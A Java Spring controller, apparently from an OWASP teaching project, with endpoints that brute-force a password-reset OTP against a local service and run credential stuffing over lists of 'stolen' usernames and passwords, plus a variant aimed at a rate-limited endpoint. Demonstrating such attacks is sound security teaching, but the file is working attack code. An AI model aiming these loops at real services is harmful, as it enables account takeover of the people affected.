package com.grid.owasp.owasp;


import lombok.extern.slf4j.Slf4j;
import org.springframework.http.*;
import org.springframework.http.client.support.BasicAuthenticationInterceptor;
import org.springframework.util.LinkedMultiValueMap;
import org.springframework.util.MultiValueMap;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.client.RestTemplate;

import java.net.URISyntaxException;
import java.util.*;

@Slf4j
@RestController
public class CredentialStuffingController {

    String hostUrl = "http://localhost:8080/";

    @PostMapping("/v1/attack")
    public ResponseEntity<String> bruteForceAttack(@RequestParam String userName, @RequestParam String newPassword) {

        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.APPLICATION_FORM_URLENCODED);

        MultiValueMap<String, String> requestBody = new LinkedMultiValueMap<>();
        requestBody.add("userName", userName);
        requestBody.add("newPassword", newPassword);

        for (int i = 0; i <= 999; i++) {
            try {
                RestTemplate restTemplate = new RestTemplate();
                restTemplate.getInterceptors().add(new BasicAuthenticationInterceptor("user", "pass"));
                String endpoint = hostUrl + "v1/reset-password?";

                HttpEntity<?> request = new HttpEntity<>(requestBody, headers);

                String url = endpoint + "otpCode=" + i;

                ResponseEntity<String> result = restTemplate.postForEntity(url, request, String.class);

                log.info("OtpCode " + i + " is CORRECT!");
                if (result.hasBody() && Objects.requireNonNull(result.getBody()).contains("success")) {
                    log.info("Result: " + result + " ATTACK is successful and password reset for user: " +
                            userName + " with new password: " + newPassword + " with otpCode: " + i);
                    return ResponseEntity.ok("ATTACK is successful and password reset for user: " +
                            userName + " with new password: " + newPassword);
                }
            } catch (Exception e) {
                log.info("OtpCode " + i + " is incorrect");
            }
        }
        return ResponseEntity.ok("ATTACK is not successful for user: " + userName);
    }

    @PostMapping("/v2/attack")
    public ResponseEntity<String> bruteForceAttackWithPrevention(@RequestParam String userName, @RequestParam String newPassword) throws URISyntaxException {

        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.APPLICATION_FORM_URLENCODED);

        MultiValueMap<String, String> requestBody = new LinkedMultiValueMap<>();
        requestBody.add("userName", userName);
        requestBody.add("newPassword", newPassword);

        for (int i = 100; i <= 150; i++) {
            try {
                RestTemplate restTemplate = new RestTemplate();
                restTemplate.getInterceptors().add(new BasicAuthenticationInterceptor("user", "pass"));
                String endpoint = hostUrl + "v2/reset-password?";

                HttpEntity<?> request = new HttpEntity<>(headers);

                String url = endpoint + "otpCode=" + i;
                ResponseEntity<String> result = restTemplate.postForEntity(url, request, String.class);

                log.info("OtpCode " + i + " is CORRECT!");
                if (result.hasBody() && Objects.requireNonNull(result.getBody()).contains("success")) {
                    log.info("Result: " + result + " ATTACK is successful and password reset for user: " +
                            userName + " with new password: " + newPassword + " with otpCode: " + i);
                    return ResponseEntity.ok("ATTACK is successful and password reset for user: " +
                            userName + " with new password: " + newPassword);
                }
            } catch (Exception e) {
                log.info("OtpCode " + i + " is incorrect");
            }
        }
        Map<String, String> errorDetails = new HashMap<>();
        errorDetails.put("ErrorMessage", "ATTACK is NOT successful for user: " + userName);
        return new ResponseEntity(errorDetails, HttpStatus.TOO_MANY_REQUESTS);
    }

    @PostMapping("/v1/login-credential-stuffing")
    public ResponseEntity<String> bruteForceAttackCredentialStuffing() {

        Set<String> usernames = CredentialsStuffingService.loadStolenData("usernames");
        Set<String> passwords = CredentialsStuffingService.loadStolenData("passwords");

        for (String username : usernames) {
            for (String password : passwords) {
                User user = User.builder().userName(username).password(password).build();
                HttpHeaders headers = new HttpHeaders();

                headers.setContentType(MediaType.APPLICATION_JSON);
                headers.setAccept(Collections.singletonList(MediaType.APPLICATION_JSON));


                MultiValueMap<String, Object> requestBody = new LinkedMultiValueMap<>();
                requestBody.add("user", user);

                try {
                    RestTemplate restTemplate = new RestTemplate();
                    restTemplate.getInterceptors().add(new BasicAuthenticationInterceptor("user", "pass"));
                    String endpoint = hostUrl + "v1/login";

                    ResponseEntity<String> result = restTemplate.postForEntity(endpoint, requestBody, String.class);

                    if (result.hasBody() && Objects.requireNonNull(result.getBody()).contains("success")) {
                        log.info("Result: " + result + " LOGIN is successful user: " +
                                username + " with password: " + password);
                        return ResponseEntity.ok("LOGIN is successful for user: " +
                                username + " with password: " + password);
                    }
                } catch (Exception e) {
                    log.info("Login failed, incorrect credentials!");
                }
            }
        }
        Map<String, String> errorDetails = new HashMap<>();
        errorDetails.put("ErrorMessage", "LOGIN is NOT successful with credential stuffing!");
        return new ResponseEntity(errorDetails, HttpStatus.BAD_REQUEST);
    }
}
